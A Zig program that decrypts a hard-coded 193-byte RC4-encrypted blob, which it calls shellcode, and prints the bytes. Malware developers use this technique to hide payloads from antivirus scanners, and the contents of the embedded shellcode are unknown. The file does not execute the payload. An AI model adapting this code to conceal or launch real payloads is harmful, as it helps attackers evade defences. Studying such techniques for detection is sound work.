const std = @import("std");

const RC4_KEY: [16]u8 = [_]u8{
    0x76, 0x21, 0x16, 0x80, 0x0a, 0xcd, 0x82, 0xb2, 0xd9, 0x9f, 0xed, 0x3b, 0x05, 0xcf, 0x09, 0xb1
};

const RC4_CIPHERTEXT: [193]u8 = [_]u8{
    0xbb, 0x54, 0xc5, 0x6a, 0x02, 0x63, 0xdc, 0x53, 0x78, 0xb6, 0x22, 0xa6, 0xc2, 0x43, 0xbe, 0x57, 
    0xbd, 0x2d, 0xca, 0x9e, 0x81, 0x36, 0x5b, 0x02, 0x18, 0xb8, 0x67, 0xea, 0x9c, 0x60, 0x3e, 0xe9, 
    0xb6, 0x6b, 0x6d, 0x7b, 0x9f, 0xa1, 0xcc, 0x31, 0x14, 0x95, 0x59, 0xc1, 0xff, 0xcf, 0x84, 0x53, 
    0x98, 0x6b, 0x46, 0x87, 0xe8, 0x3e, 0x1f, 0x75, 0x1a, 0x04, 0x1f, 0xc0, 0x95, 0x49, 0xd5, 0x28, 
    0x0a, 0xc8, 0xdb, 0x0d, 0x16, 0xc5, 0xc8, 0xe6, 0xae, 0x54, 0xba, 0xaa, 0xcf, 0xc6, 0x6b, 0x6b, 
    0x0d, 0x03, 0x71, 0xf5, 0xea, 0x40, 0x54, 0xed, 0x5b, 0x41, 0xa0, 0x0f, 0x7e, 0x6c, 0xc0, 0xf8, 
    0x14, 0x58, 0xf7, 0x41, 0x02, 0x68, 0xbd, 0x2b, 0x96, 0x11, 0x4a, 0x6f, 0xc2, 0x22, 0x44, 0x53, 
    0x4e, 0x72, 0xad, 0x10, 0x74, 0x24, 0x57, 0xef, 0xcc, 0x61, 0xa9, 0xae, 0xbe, 0x8c, 0x1f, 0x53, 
    0xf3, 0x2b, 0x31, 0xa8, 0x41, 0xe8, 0x55, 0x91, 0xaf, 0x52, 0x3e, 0x86, 0x21, 0x19, 0x5a, 0x4a, 
    0x79, 0x46, 0x0b, 0xde, 0x23, 0xec, 0xbc, 0x6f, 0x45, 0xe5, 0x1a, 0xac, 0x64, 0xb6, 0xb9, 0x77, 
    0x2e, 0xa3, 0xdf, 0x4a, 0x6f, 0xa6, 0x8d, 0xa4, 0x81, 0x0b, 0x1a, 0xd4, 0xed, 0x62, 0x51, 0x48, 
    0x2c, 0xd7, 0xec, 0x90, 0x98, 0xa5, 0xdc, 0xc5, 0xe2, 0x5c, 0x2b, 0x86, 0xfd, 0xdc, 0xd9, 0xf3, 
    0xd7
};

fn rc4Decryption(key: []const u8, data: []u8) void {
    // RC4 Key Scheduling Algorithm (KSA)
    var s: [256]u8 = undefined;
    for (0..256) |i| {
        s[i] = @as(u8, @intCast(i));
    }

    var j: u32 = 0;
    for (0..256) |i| {
        j = (j + s[i] + key[i % key.len]) % @as(u32, 256);
        const temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }

    // RC4 Pseudo-Random Generation Algorithm (PRGA)
    var i: u32 = 0;
    j = 0;
    for (data) |*byte| {
        i = (i + 1) % @as(u32, 256);
        j = (j + s[i]) % @as(u32, 256);
        const temp = s[i];
        s[i] = s[j];
        s[j] = temp;
        const k = (@as(u32, s[i]) + @as(u32, s[j])) % @as(u32, 256);
        const keystream_byte = s[k];
        byte.* ^= keystream_byte;
    }
}

pub fn main() !void {
    var ciphertext = RC4_CIPHERTEXT;
    rc4Decryption(&RC4_KEY, &ciphertext);
    std.debug.print("Decrypted shellcode length: {}\n", .{ciphertext.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{ciphertext});
}
